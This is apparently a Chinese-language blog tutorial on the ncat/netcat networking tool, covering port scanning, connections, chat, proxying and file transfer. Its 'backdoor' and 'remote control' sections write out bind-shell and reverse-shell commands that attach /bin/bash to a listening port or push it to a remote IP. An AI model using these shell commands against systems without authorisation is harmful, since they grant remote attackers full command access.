
+++
authors = ["lzy"]
title = "Ncat 一个非常强大的 linux 工具"
date = "2025-02-27 20:20:20"
description = ""
tags = [
"linux"
]
categories = [
"技术文档"
]
+++

# Ncat 一个非常强大的 linux 工具

## 摘要

用 linux 系统的很多人，或多或少都用过 nc 这个命令，全称为 netcat，用于 TCP、UDP 或 unix 域套接字(uds)的数据流操作，但早在 2007 年就不维护了，后续由 nmap 的作者 Fyodor 重写了一个 ncat 的工具，兼容 nc 并且在此基础上增强了部分能力。

那 ncat 这个命令能干什么呢？

比如可以做端口扫描、端口探活、文件传输、远程控制、反弹 shell，还能做端口转发、代理服务，甚至可以作为一个聊天工具，被誉为网络界的瑞士军刀！

## 命令帮助

输入命令 ncat -h 可以查看 ncat 命令的帮助文档，接下来介绍一下 ncat 的用法

```bash
Ncat 7.95 ( https://nmap.org/ncat )
Usage: ncat [options] [hostname] [port]

Options taking a time assume seconds. Append 'ms' for milliseconds,
's' for seconds, 'm' for minutes, or 'h' for hours (e.g. 500ms).
  -4                         Use IPv4 only
  -6                         Use IPv6 only
  -U, --unixsock             Use Unix domain sockets only
      --vsock                Use vsock sockets only
  -C, --crlf                 Use CRLF for EOL sequence
  -c, --sh-exec <command>    Executes the given command via /bin/sh
  -e, --exec <command>       Executes the given command
      --lua-exec <filename>  Executes the given Lua script
  -g hop1[,hop2,...]         Loose source routing hop points (8 max)
  -G <n>                     Loose source routing hop pointer (4, 8, 12, ...)
  -m, --max-conns <n>        Maximum <n> simultaneous connections
  -h, --help                 Display this help screen
  -d, --delay <time>         Wait between read/writes
  -o, --output <filename>    Dump session data to a file
  -x, --hex-dump <filename>  Dump session data as hex to a file
  -i, --idle-timeout <time>  Idle read/write timeout
  -p, --source-port port     Specify source port to use
  -s, --source addr          Specify source address to use (doesn't affect -l)
  -l, --listen               Bind and listen for incoming connections
  -k, --keep-open            Accept multiple connections in listen mode
  -n, --nodns                Do not resolve hostnames via DNS
  -t, --telnet               Answer Telnet negotiations
  -u, --udp                  Use UDP instead of default TCP
      --sctp                 Use SCTP instead of default TCP
  -v, --verbose              Set verbosity level (can be used several times)
  -w, --wait <time>          Connect timeout
  -z                         Zero-I/O mode, report connection status only
      --append-output        Append rather than clobber specified output files
      --send-only            Only send data, ignoring received; quit on EOF
      --recv-only            Only receive data, never send anything
      --no-shutdown          Continue half-duplex when receiving EOF on stdin
      --allow                Allow only given hosts to connect to Ncat
      --allowfile            A file of hosts allowed to connect to Ncat
      --deny                 Deny given hosts from connecting to Ncat
      --denyfile             A file of hosts denied from connecting to Ncat
      --broker               Enable Ncat's connection brokering mode
      --chat                 Start a simple Ncat chat server
      --proxy <addr[:port]>  Specify address of host to proxy through
      --proxy-type <type>    Specify proxy type ("http", "socks4", "socks5")
      --proxy-auth <auth>    Authenticate with HTTP or SOCKS proxy server
      --proxy-dns <type>     Specify where to resolve proxy destination
      --ssl                  Connect or listen with SSL
      --ssl-cert             Specify SSL certificate file (PEM) for listening
      --ssl-key              Specify SSL private key (PEM) for listening
      --ssl-verify           Verify trust and domain name of certificates
      --ssl-trustfile        PEM file containing trusted SSL certificates
      --ssl-ciphers          Cipherlist containing SSL ciphers to use
      --ssl-servername       Request distinct server name (SNI)
      --ssl-alpn             ALPN protocol list to use
      --version              Display Ncat's version information and exit

See the ncat(1) manpage for full options, descriptions and usage examples
```

## 端口扫描

```bash
nc -v -z -w2 127.0.0.1 1-100 # 扫描本机范围是 1-100的TCP端口，超时时间为2s
nc -u -z -w2 127.0.0.1 1-1000 # 扫描本机范围是 1-1000的UDP端口，超时时间为2s
nc -nvv 127.0.0.1 80 # 扫描指定端口
```

## 端口连接

```bash
#监听端口
ncat -l 8080
#连接远程系统
ncat 192.168.1.100 80
#连接udp端口
ncat -l -u 1234
#测试端口连通性
ncat -v -u 192.168.105.150 53
```

## 聊天工具

```bash
#nc作为聊天工具
ncat -l 8080     # 服务端
ncat 192.168.1.100 8080    #客户端
```

## 代理转发

```bash
#作为代理
#发往服务器 8080 端口的连接都会自动转发到 192.168.1.200 上的 80 端口
ncat -l 8080 | ncat 192.168.1.200 80
#同时能够接受返回的数据，我们需要创建一个双向管道
ncat -l 8080 0<2way | ncat 192.168.1.200 80 1>2way

#端口转发, 连接到 80 端口的连接都会转发到 8080 端口
ncat -u -l  80 -c  'ncat -u -l 8080'
```

## 创建后门

```bash
#创建后门, -e 标志将一个 bash 与端口 10000 相连
ncat -l 10000 -e /bin/bash
#客户端只要连接到服务器上的 10000 端口就能通过 bash 获取我们系统的完整访问权限
ncat 192.168.1.100 10000
```

## 文件拷贝

```bash
#拷贝文件， -–send-only 选项会在文件拷贝完后立即关闭连接
ncat -l  8080 > file.txt    # 监听
ncat 192.168.1.100 8080 --send-only < data.txt #目标机器把文件传过来
```

## 远程控制

```bash
# 正向控制，被控端主动设置监听端口及bash环境，控制端连接，如果有防火墙，需开放端口，否则会被拦截。
# 被控制端执行下面的命令：
nc -lvnp 8888 -c bash
# 控制端执行下面的命令：
nc 192.168.xxx.xxx 8888

# 反向控制，控制端设置监听端口，被控端主动连接控制端的ip及端口，并提供bash环境。
# 控制端执行下面的命令：
nc -lvnp 8888
# 被控制端执行下面的命令：
nc 192.168.75.121 8888 -c bash
```

## 总结

ncat 用法太多，因为 ncat 本质是用于操作 tcp 和 udp 连接数据流的，所以理论上所有基于 4 层网络的操作都可以使用 ncat 来处理，在日常运维中还有更多用法，各位可以继续探索！
